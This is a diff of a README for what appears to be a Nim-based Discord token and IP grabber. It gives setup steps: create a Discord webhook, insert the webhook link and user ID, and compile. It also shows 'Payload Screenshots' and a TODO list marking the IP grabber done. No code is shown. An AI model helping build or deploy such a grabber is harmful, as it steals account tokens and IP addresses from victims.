@@ -17,7 +17,7 @@
 </p>
 
 ## How to use
-- **MUST: Install Nim [(using my guide)](https://gist.github.com/NullCode1337/95addeca955456c92aeb9fbc26f3615a)**
+- **MUST: Install Nim [(using my guide if you want)](https://gist.github.com/NullCode1337/95addeca955456c92aeb9fbc26f3615a)**
 - Since this needs a Discord Webhook (like all things do), go create one
 - Download repo as zip / git clone, and store somewhere
 - Replace the webhook link, user ID and toggle whatever you need
@@ -36,18 +36,22 @@ strip -s <file>.exe
 2) narimiran and [his legendary guide](https://github.com/narimiran/nim-basics)
 3) [Yardanico](https://github.com/Yardanico), enthus1ast and Rika on Nim Discord
 
-## Screenshots
+## Payload Screenshots
 - Without embed:
 
-![Without embed](https://user-images.githubusercontent.com/70959549/135741426-ac45946f-f183-4297-9a50-f01279c793c4.png)
+![Without embed](https://user-images.githubusercontent.com/70959549/135741426-ac45946f-f183-4297-9a50-f01279c793c4.png?size=256)
 
 - With embed:
 
-![With embed](https://user-images.githubusercontent.com/70959549/135741404-daa25f29-16bd-4d0e-866e-8ad269cb1ecb.png)
+![With embed](https://user-images.githubusercontent.com/70959549/146967659-9228c84b-3664-4c1d-9708-338ec696d1e8.png)
 
-### TODO
+
+### TODO [Fully Complete]
 - [X] Testing on PCs without Nim toolchain
 - [X] Nicer upload (using embeds)
 - [X] Make code less weird
-- [ ] Token Checker
 - [X] IP Grabber
+
+----------
+
+Archived because it's totally complete, like I have nothing else important that I want to add
